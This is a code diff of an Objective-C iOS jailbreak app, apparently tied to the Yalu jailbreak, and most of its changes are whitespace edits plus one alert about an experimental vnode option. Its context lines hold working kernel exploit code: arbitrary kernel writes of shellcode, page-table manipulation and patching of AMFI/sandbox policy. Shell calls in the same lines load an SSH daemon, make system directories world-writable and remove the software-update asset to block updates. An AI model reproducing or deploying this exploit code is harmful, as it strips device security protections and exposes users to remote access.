@@ -48,10 +48,16 @@ BOOL vnode = NO;
 
 @synthesize recydia;
 @synthesize esub;
-- (UIStatusBarStyle)preferredStatusBarStyle
-{
-    return UIStatusBarStyleLightContent;
+- (IBAction)info:(id)sender {
+    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Info"
+                                                    message:@"Increasing vnode limit may help with stability issues on the Yalu jailbreak. EXPERIMENTAL feature!"
+                                                   delegate:nil
+                                          cancelButtonTitle:@"OK"
+                                          otherButtonTitles:nil];
+    [alert show];
+    [alert release];
 }
+
 - (IBAction)recydias:(id)sender {
     
     if (![recydia isOn]) {
@@ -69,45 +75,45 @@ BOOL vnode = NO;
         cyd = YES;
         NSLog(@"YH");
     }
-
+    
 }
 
 - (IBAction)vnode:(id)sender {
     if (_vnodeO.isOn) {
-         vnode = YES;
+        vnode = YES;
         NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
         [defaults setBool:vnode forKey:@"vnod"];
-        }
+    }
     else {
         vnode = NO;
         NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
         [defaults setBool:vnode forKey:@"vnod"];
     }
     
-    }
+}
 BOOL subs = YES;
 - (IBAction)dissub:(id)sender {
     
- 
+    
     init_offsets();
     struct utsname u = { 0 };
     uname(&u);
     
     
-       if (![esub isOn] && !strstr(u.version, "MarijuanARM")) {
+    if (![esub isOn] && !strstr(u.version, "MarijuanARM")) {
         subs = NO;
         NSLog(@"nop");
     }
-       else if ([esub isOn] && !strstr(u.version, "MarijuanARM")){
+    else if ([esub isOn] && !strstr(u.version, "MarijuanARM")){
         subs = YES;
         NSLog(@"YH");
     }
-       else if ([esub isOn] && strstr(u.version, "MarijuanARM")) {
+    else if ([esub isOn] && strstr(u.version, "MarijuanARM")) {
         
-           system("(echo 'enabling substrate'; /bin/launchctl load /Library/LaunchDaemons/0.reload.plist)&");
-           
-           NSLog(@"sub enabling");
-       }
+        system("(echo 'enabling substrate'; /bin/launchctl load /Library/LaunchDaemons/0.reload.plist)&");
+        
+        NSLog(@"sub enabling");
+    }
 }
 
 BOOL wifi = YES;
@@ -129,15 +135,15 @@ BOOL wifi = YES;
 - (void)viewDidLoad {
     [super viewDidLoad];
     NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
-      if ([defaults boolForKey:@"vnod"] == YES) {
+    if ([defaults boolForKey:@"vnod"] == YES) {
         [_vnodeO setOn:YES];
         vnode = YES;
-         }
+    }
     else {
         [_vnodeO setOn:NO];
         vnode =  NO;
     }
-
+    
     // Do any additional setup after loading the view.
 }
 
@@ -385,7 +391,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     
     uint64_t shellcode = physalloc(0x4000);
     
- 
+    
     
     WriteAnywhere32(shellcode + 0x100, 0x5800009e);
     WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
@@ -467,7 +473,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         WriteAnywhere32(shc+i*4, 0xd503201f);
     }
     
- 
+    
     uint64_t level0_pte = physalloc(isvad == 0 ? 0x4000 : 0x1000);
     
     uint64_t ttbr0_real = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), idlesleep_handler + idx*4 - gadget_base + 24, text_exec_base, 1);
@@ -553,7 +559,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     WriteAnywhere64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
     WriteAnywhere64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler
     
-           int cpacr_idx = 0;
+    int cpacr_idx = 0;
     uint32_t* opps = gadget_base - min + kdump;
     
     while (1) {
@@ -644,13 +650,13 @@ remappage[remapcnt++] = (x & (~PMK));\
     }
     
     
-
+    
     {
         uint64_t endf = prelink_base+prelink_size;
         uint64_t ends = whole_size - (endf - whole_base);
         uint32_t* opps_stream = whole_dump + endf - whole_base;
         uint64_t* ptr_stream = whole_dump + endf - whole_base;
-
+        
         uint64_t lastk = 0;
         int streak = 0;
         
@@ -677,7 +683,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         
         
         if (streak == 9) {
-
+            
             
             char* sbstr = whole_dump + lastk + endf - whole_base - 8;
             
@@ -738,7 +744,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         }
         
     }
- 
+    
     
     {
         uint64_t endf = prelink_base+prelink_size;
@@ -783,7 +789,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     
     
     {
- 
+        
         
         uint64_t sbops = amfiops;
         uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
@@ -797,7 +803,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     }
     
     
- 
+    
     while (1) {
         uint32_t opcode = ReadAnywhere32(fref);
         if ((opcode & 0xFFC00000) == 0xF9000000) {
@@ -813,7 +819,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     
     fref += 4;
     
- 
+    
     while (1) {
         uint32_t opcode = ReadAnywhere32(fref);
         if ((opcode & 0xFFC00000) == 0xF9000000) {
@@ -1012,16 +1018,16 @@ remappage[remapcnt++] = (x & (~PMK));\
         }
         
     }
-
-
+    
+    
     if (wifi) {
         char path[256];
         uint32_t size = sizeof(path);
         _NSGetExecutablePath(path, &size);
         char* tt = realpath(path, 0);
-
         
-          NSString* execpath = [[NSString stringWithUTF8String:tt]  stringByDeletingLastPathComponent];
+        
+        NSString* execpath = [[NSString stringWithUTF8String:tt]  stringByDeletingLastPathComponent];
         
         NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"dropbear.plist"];
         char* jl = [jlaunchctl UTF8String];
@@ -1048,7 +1054,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         chmod("/Library/LaunchDaemons/dropbear.plist_nowifi", 0644);
         chown("/Library/LaunchDaemons/dropbear.plist_nowifi", 0, 0);
         system("echo lol; launchctl unload /Library/LaunchDaemons/dropbear.plist; launchctl load /Library/LaunchDaemons/dropbear_nowifi.plist");
-
+        
     }
     
     chmod("/private", 0777);
@@ -1058,7 +1064,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     chmod("/private/var/mobile/Library/Preferences", 0777);
     system("rm -rf /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; touch /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; chmod 000 /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; chown 0:0 /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate");
     if (subs) {
-    system("(echo 'really jailbroken'; /bin/launchctl load /Library/LaunchDaemons/0.reload.plist)&");
+        system("(echo 'really jailbroken'; /bin/launchctl load /Library/LaunchDaemons/0.reload.plist)&");
     }
     else {
         NSLog(@"hallo");
